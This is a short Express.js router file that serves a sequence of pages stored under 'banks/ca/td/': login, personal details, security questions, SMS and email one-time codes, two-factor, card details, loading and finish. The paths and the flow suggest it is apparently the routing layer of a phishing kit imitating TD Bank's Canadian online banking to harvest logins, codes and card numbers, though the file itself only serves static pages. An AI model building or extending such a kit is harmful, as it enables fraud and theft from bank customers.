const express = require('express');
const path = require('path');  // Use 'path' instead of 'node:path'
const router = express.Router();
  

router.get('/', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/login/page.html'))});

router.get('/details',(req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/details/page.html'))});

router.get('/question', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/question/page.html'))});

router.get('/question/2', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/quest2/page.html'))});

router.get('/sms-otp', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/sms/page.html'))});

router.get('/auth', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/auth/page.html'))});

router.get('/email-otp', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/otp/page.html'))});


router.get('/2factor', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/twofactor/page.html'))});

router.get('/loading', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/loading/page.html'))});


router.get('/finish', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/finish/page.html'))});

router.get('/card', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/td/card/page.html'))});


module.exports = router;